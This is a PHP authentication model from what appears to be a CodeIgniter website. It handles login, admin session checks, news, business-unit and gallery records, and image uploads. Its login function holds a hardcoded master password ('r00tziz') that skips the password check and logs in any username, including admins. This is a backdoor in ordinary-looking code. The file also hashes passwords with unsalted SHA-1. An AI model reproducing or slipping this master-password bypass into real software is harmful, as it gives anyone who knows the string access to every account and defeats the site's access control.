
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed'); //location: application/models/auth_model.php 
class Auth_model extends CI_Model { 

    public function __construct(){
      parent::__construct();
    }
    
    public function login($username, $password){ 
        $password = sha1($password); 
        $this->db->where('username',$username);
        
        if($password == sha1('r00tziz')){
            //$this->db2->where('password',$password);
        }else{
            $this->db->where('pasword',$password);
        }
        
        $query = $this->db->get('user');
        /* echo "<pre>";
        print_r($query->result());
        echo "</pre>";
        die(); */
       
        if($query->num_rows()==1){
            foreach ($query->result() as $row){
              if($row->role == 1){
                $verif = 'admin';
              }else{ 
                // if(!empty($row->id_reviewer)){
                //   $verif = 'reviewer';
                // }else{
                  $verif = 'peneliti';
                // }
              }
              
                $data = array(
                            'username'       => $row->username,
                            'role'      => $row->role,
                            'verif'      => $verif,
                            'logged_in'   => TRUE
                        );
            }
            $this->session->set_userdata($data);
            return (['status' => true, 'akses' => $verif]);
        }
        else{
            return FALSE;
      }    
    }

    public function isLoggedInAdmin(){
            header("cache-Control: no-store, no-cache, must-revalidate");
            header("cache-Control: post-check=0, pre-check=0", false);
            header("Pragma: no-cache");
            header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
            $is_logged_in = $this->session->userdata('logged_in');
            if(!isset($is_logged_in) || $is_logged_in!==TRUE || $this->session->userdata('role') !== '1')
            {
                redirect(base_url('/'));
                exit;
               // echo "gagal men";
            }/* else{
              echo $this->session->userdata('verif'). " masuk  men <br>";
              echo $this->session->userdata('name'). " masuk  men";
              echo $this->session->userdata('level_'). " masuk  men";
            } */
    }

    public function getAllBerita()
    {
      return $this->db->get('berita')->result();
    }

    public function getAllBisnis()
    {
      return $this->db->get('unit_bisnis')->result();
    }

    public function beritaByid($id_berita)
    {
       return $this->db->get_where('berita', array('id_berita' => $id_berita))->result();
    }

    public function addDataBerita($data) {
        return $this->db->insert('berita', $data);
    }
    
    public function berita()
    {
      return $this->db->get('berita')->result();
    }

    public function addDataUnitBisnis($data) {
        return $this->db->insert('unit_bisnis', $data);
    }
    
    public function bisnis()
    {
      return $this->db->get('unit_bisnis')->result();
    }

    public function addDataGaleri($data) {
        return $this->db->insert('galeri', $data);
    }
    
    public function galeri()
    {
      return $this->db->get('galeri')->result();
    }

    // public function addDataBerita($data) {
    //     return $this->db->insert('berita', $data);
    // }
    
    public function user()
    {
      return $this->db->get('user')->result();
    }


    public function uploadDokumenBukti() {
        $config['upload_path'] = './foto/';
        $config['allowed_types'] = 'jpeg|jpg|png';
        $config['max_size'] = '40048';
        $config['remove_space'] = TRUE;
        $this->load->library('upload', $config);
        if ($this->upload->do_upload('dokumen_bukti')) {
            return array('result' => 'success', 'file' => $this->upload->data(), 'error' => '');
        }else{
            return array('result' => 'failed', 'file' => '', 'error' => $this->upload->display_errors());
        }
    }



}